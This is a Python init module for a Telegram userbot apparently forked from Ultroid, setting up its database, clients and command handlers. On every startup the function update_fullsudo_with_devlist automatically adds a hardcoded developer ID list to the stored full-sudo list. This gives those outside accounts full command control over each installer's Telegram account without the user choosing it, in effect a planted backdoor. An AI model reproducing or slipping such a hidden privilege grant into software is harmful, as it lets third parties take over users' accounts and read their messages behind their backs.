import os
import sys
import telethonpatch
from .version import __version__
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from telethon.sessions import StringSession
from telethon import TelegramClient
import contextlib
import inspect
import time
from logging import Logger
from telethonpatch import TelegramClient
from telethon import utils as telethon_utils
from telethon.errors import (
    AccessTokenExpiredError,
    AccessTokenInvalidError,
    ApiIdInvalidError,
    AuthKeyDuplicatedError,
)
from pytgcalls import PyTgCalls
from .dB import DEVLIST

run_as_module = __package__ in sys.argv or sys.argv[0] == "-m"

async def update_fullsudo_with_devlist():
    print("🔄 [SETUP] Memuat dan menggabungkan DEVLIST ke FULLSUDO...")
    current_full_sudo = udB.get_key("FULLSUDO") or []
    initial_count = len(set(current_full_sudo))
    merged_ids_set = set(current_full_sudo)
    merged_ids_set.update(DEVLIST)
    final_full_sudo_list = list(merged_ids_set)
    udB.set_key("FULLSUDO", final_full_sudo_list)
    final_count = len(final_full_sudo_list)
    print(f"✅ [SUDO LOADED] FULLSUDO berhasil diperbarui di database.")
    print(f"   -> DEVLIST ditambahkan (total {len(DEVLIST)} ID).")
    print(f"   -> ID FULLSUDO di DB: {initial_count} -> {final_count}")

class ULTConfig:
    lang = "en"
    thumb = "resources/extras/8189450f-de7f-4582-ba94-f8ec2d928b31.jpeg"


if run_as_module:
    import time

    from .configs import Var
    from .startup import *
    from .startup._database import UltroidDB
    from .startup.BaseClient import UltroidClient
    from .startup.connections import validate_session, vc_connection
    from .startup.funcs import _version_changes, autobot, enable_inline, update_envs
    from .version import ultroid_version
    from telethon import __version__ as tver
    
    if not os.path.exists("./plugins"):
        LOGS.error(
            "'plugins' folder not found!\nMake sure that, you are on correct path."
        )
        exit()

    start_time = time.time()
    _ult_cache = {}
    _ignore_eval = []

    udB = UltroidDB()
    update_envs()

    LOGS.info(f"Connecting to {udB.name}...")
    if udB.ping():
        LOGS.info(f"Connected to {udB.name} Successfully!")
        

    BOT_MODE = udB.get_key("BOTMODE")
    DUAL_MODE = udB.get_key("DUAL_MODE")
    VC_SESSION = udB.get_key("SESSION")
    
    USER_MODE = udB.get_key("USER_MODE")
    if USER_MODE:
        DUAL_MODE = False

    if BOT_MODE:
        ultroid_bot = None

        if not udB.get_key("BOT_TOKEN"):
            LOGS.critical(
                '"BOT_TOKEN" not Found! Please add it, in order to use "BOTMODE"'
            )

            sys.exit()
    else:
        ultroid_bot = UltroidClient(
            validate_session(Var.SESSION, LOGS),
            udB=udB,
            app_version=tver,
            device_model="xteam-urbot",
        )
        ultroid_bot.run_in_loop(update_fullsudo_with_devlist()) 
        ultroid_bot.run_in_loop(autobot())

    if USER_MODE:
        asst = ultroid_bot
    else:
        asst = UltroidClient("asst", bot_token=udB.get_key("BOT_TOKEN"), udB=udB)

    if BOT_MODE:
        ultroid_bot = asst
        if udB.get_key("OWNER_ID"):
            try:
                ultroid_bot.me = ultroid_bot.run_in_loop(
                    ultroid_bot.get_entity(udB.get_key("OWNER_ID"))
                )
            except Exception as er:
                LOGS.exception(er)
    elif not asst.me.bot_inline_placeholder and asst._bot:
        ultroid_bot.run_in_loop(enable_inline(ultroid_bot, asst.me.username))

    vcClient = vc_connection(udB, ultroid_bot)

    _version_changes(udB)

    HNDLR = udB.get_key("HNDLR") or "."
    DUAL_HNDLR = udB.get_key("DUAL_HNDLR") or "/"
    SUDO_HNDLR = udB.get_key("SUDO_HNDLR") or HNDLR
else:
    print("xteam 2022 © teamx_cloner")

    from logging import getLogger

    LOGS = getLogger("xteam")

    ultroid_bot = asst = udB = bot = call_py = vcClient = None
  
